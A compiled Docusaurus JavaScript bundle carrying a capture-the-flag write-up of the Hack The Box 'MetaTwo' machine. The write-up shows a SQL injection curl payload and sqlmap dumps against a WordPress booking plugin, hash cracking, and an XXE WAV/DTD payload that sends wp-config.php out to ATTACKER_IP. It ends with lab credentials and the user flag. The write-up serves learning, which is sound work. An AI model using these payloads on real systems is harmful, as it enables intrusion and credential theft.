"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[2669],{3905:(e,t,a)=>{a.d(t,{Zo:()=>c,kt:()=>h});var n=a(7294);function r(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function p(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function s(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?p(Object(a),!0).forEach((function(t){r(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):p(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function o(e,t){if(null==e)return{};var a,n,r=function(e,t){if(null==e)return{};var a,n,r={},p=Object.keys(e);for(n=0;n<p.length;n++)a=p[n],t.indexOf(a)>=0||(r[a]=e[a]);return r}(e,t);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(n=0;n<p.length;n++)a=p[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(r[a]=e[a])}return r}var i=n.createContext({}),l=function(e){var t=n.useContext(i),a=t;return e&&(a="function"==typeof e?e(t):s(s({},t),e)),a},c=function(e){var t=l(e.components);return n.createElement(i.Provider,{value:t},e.children)},m="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},d=n.forwardRef((function(e,t){var a=e.components,r=e.mdxType,p=e.originalType,i=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),m=l(a),d=r,h=m["".concat(i,".").concat(d)]||m[d]||u[d]||p;return a?n.createElement(h,s(s({ref:t},c),{},{components:a})):n.createElement(h,s({ref:t},c))}));function h(e,t){var a=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var p=a.length,s=new Array(p);s[0]=d;var o={};for(var i in t)hasOwnProperty.call(t,i)&&(o[i]=t[i]);o.originalType=e,o[m]="string"==typeof e?e:r,s[1]=o;for(var l=2;l<p;l++)s[l]=a[l];return n.createElement.apply(null,s)}return n.createElement.apply(null,a)}d.displayName="MDXCreateElement"},7610:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>i,contentTitle:()=>s,default:()=>h,frontMatter:()=>p,metadata:()=>o,toc:()=>l});var n=a(7462),r=(a(7294),a(3905));const p={},s="MetaTwo",o={unversionedId:"writeups/htb/metatwo",id:"writeups/htb/metatwo",title:"MetaTwo",description:"nmap scan",source:"@site/docs/writeups/htb/metatwo.md",sourceDirName:"writeups/htb",slug:"/writeups/htb/metatwo",permalink:"/docs/writeups/htb/metatwo",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/htb/metatwo.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"\u2139\ufe0f About",permalink:"/docs/writeups/"},next:{title:"Precious",permalink:"/docs/writeups/htb/precious"}},i={},l=[{value:"nmap scan",id:"nmap-scan",level:3},{value:"Analyzing the website",id:"analyzing-the-website",level:3}],c=(m="Image",function(e){return console.warn("Component "+m+" was not imported, exported, or provided by MDXProvider as global scope"),(0,r.kt)("div",e)});var m;const u={toc:l},d="wrapper";function h(e){let{components:t,...a}=e;return(0,r.kt)(d,(0,n.Z)({},u,a,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"metatwo"},"MetaTwo"),(0,r.kt)(c,{src:"/images/writeups/htb/metatwo/banner.png",mdxType:"Image"}),(0,r.kt)("h3",{id:"nmap-scan"},"nmap scan"),(0,r.kt)("p",null,"By scanning with nmap we can find three open ports. In particular, on port 80 there is a website available based on Wordpress at the address ",(0,r.kt)("inlineCode",{parentName:"p"},"metapress.htb")),(0,r.kt)(c,{src:"/images/writeups/htb/metatwo/nmap.png",mdxType:"Image"}),(0,r.kt)("h3",{id:"analyzing-the-website"},"Analyzing the website"),(0,r.kt)("p",null,"By looking to the source code of the index it is possible to see that the website uses Wordpress."),(0,r.kt)(c,{src:"/images/writeups/htb/metatwo/source.png",mdxType:"Image"}),(0,r.kt)("p",null,"We can also notice that a plugin called bookingpress-appointment-booking is used. with version 1.0.10. It is enough to search on Google for vulnerabilities to find a SQLi."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://wordpress.org/plugins/bookingpress-appointment-booking/"},"https://wordpress.org/plugins/bookingpress-appointment-booking/")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357"},"https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357")),(0,r.kt)("p",null,"The SQLi is:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'\n")),(0,r.kt)("p",null,"Enumerate dbs"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --dbs\n")),(0,r.kt)("p",null,"Enumerate users"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch -D blog -T wp_users --dump\n")),(0,r.kt)("p",null,"Get password of admin and manager users"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --sql-query \"SELECT user_pass FROM wp_users WHERE ID=1\"\n")),(0,r.kt)(c,{src:"/images/writeups/htb/metatwo/sqlmap.png",mdxType:"Image"}),(0,r.kt)("p",null,"Final hashes"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. admin\n$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 manager\n")),(0,r.kt)("p",null,"Using hashcat and the rockyou list is possible to find the password for manager: ",(0,r.kt)("inlineCode",{parentName:"p"},"partylikearockstar"),"."),(0,r.kt)(c,{src:"/images/writeups/htb/metatwo/manager.png",mdxType:"Image"}),(0,r.kt)("p",null,"Once inside we can try to exploit the permissions of the manager user.\nWe can use tool like Wappalyzer to find the version of Wordpress used by the website (5.6.2)."),(0,r.kt)("p",null,"There is a vulnerability that exploits the upload of a new media element to the website. The vulnerability is described here:"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5"},"https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5")),(0,r.kt)("p",null,"One file will be used for upload:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml",metastring:'title="payload.wav"',title:'"payload.wav"'},'RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM "http://ATTACKER_IP:ATTACKER_PORT/xxe.dtd">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n')),(0,r.kt)("p",null,"Another will be server on the attacker machine:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml",metastring:'title="xxe.dtd"',title:'"xxe.dtd"'},'<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://ATTACKER_IP:ATTACKER_PORT/?%data;\'>">\n')),(0,r.kt)("p",null,"Change ATTACKER_IP and ATTACKER_PORT with your values."),(0,r.kt)("p",null,"Remember to serve the file on your local pc:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"python3 -m http.server PORT\n")),(0,r.kt)("p",null,"In the ",(0,r.kt)("inlineCode",{parentName:"p"},"wp-config.php")," we can find the credentials for the ftp server:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php",metastring:'title="wp-config.php"',title:'"wp-config.php"'},"...\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\n...\n")),(0,r.kt)(c,{src:"/images/writeups/htb/metatwo/ftp.png",mdxType:"Image"}),(0,r.kt)("p",null,"In addition to the blog files, there is also a folder called ",(0,r.kt)("inlineCode",{parentName:"p"},"mailer")," where we can find a file ",(0,r.kt)("inlineCode",{parentName:"p"},"send_email.php"),".\nInside the file we can find the credentials for the mail server:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php",metastring:'title="send_email.php"',title:'"send_email.php"'},'...\n$mail->Username = "jnelson@metapress.htb";\n$mail->Password = "Cb4_JmWM8zUZWMu@Ys";\n...\n')),(0,r.kt)("p",null,"We can try to use them for ssh:"),(0,r.kt)("p",null,"In this way we obtain the user flag:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"4df68ef9947c09d45b2cd642455d4e1a\n")))}h.isMDXComponent=!0}}]);